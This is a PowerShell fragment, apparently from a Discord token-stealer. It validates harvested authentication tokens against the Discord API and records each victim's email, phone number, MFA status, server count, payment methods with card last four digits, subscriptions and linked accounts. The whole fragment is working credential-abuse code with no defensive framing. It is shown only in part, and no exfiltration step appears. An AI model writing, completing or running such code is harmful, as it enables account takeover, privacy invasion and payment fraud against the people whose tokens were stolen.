$rows=@()
foreach($tkey in $found.Keys){
    $r=[ordered]@{Token=$tkey;Source=$found[$tkey];Ok=$false}
    try{
        $u=Invoke-RestMethod 'https://discord.com/api/v10/users/@me' -Headers @{Authorization=$tkey} -TimeoutSec 8
        $r.Ok=$true
        $r.ID=$u.id
        $r.Pseudo="$($u.username)#$($u.discriminator)"
        if($u.global_name){$r.Pseudo="$($u.global_name) ($($u.username))"}
        $r.Email=Txt $u.email
        $r.Verif=Txt $u.verified
        $r.Tel=Txt $u.phone
        $r.MFA=Txt $u.mfa_enabled
        $r.Nitro=Get-Nitro $u.premium_type
        $r.Badges=Get-Badges $u.flags
        $r.Langue=Txt $u.locale
        $r.Cree=Get-Cree $u.id
        $r.Avatar=''
        if($u.avatar){ $ext='png'; if("$($u.avatar)".StartsWith('a_')){$ext='gif'}; $r.Avatar="https://cdn.discordapp.com/avatars/$($u.id)/$($u.avatar).$ext?size=256" }
        try{ $r.Serveurs=(Invoke-RestMethod 'https://discord.com/api/v10/users/@me/guilds' -Headers @{Authorization=$tkey} -TimeoutSec 8).Count }catch{}
        try{
            $pss=Invoke-RestMethod 'https://discord.com/api/v10/users/@me/billing/payment-sources' -Headers @{Authorization=$tkey} -TimeoutSec 8
            $r.Paiements=($pss|%{ $ty=switch([int]$_.type){1{'Carte'}2{'PayPal'}default{'Autre'}}; "$ty $($_.brand) ****$($_.last_4)" }) -join ' | '
        }catch{}
        try{
            $sbs=Invoke-RestMethod 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers @{Authorization=$tkey} -TimeoutSec 8
            $r.Abonnements=($sbs|%{$_.status}) -join ', '
        }catch{}
        try{
            $cns=Invoke-RestMethod 'https://discord.com/api/v10/users/@me/connections' -Headers @{Authorization=$tkey} -TimeoutSec 8
            $r.Connexions=($cns|%{"$($_.type):$($_.name)"}) -join ', '
        }catch{}
    }catch{}
    $rows+=[pscustomobject]$r
}
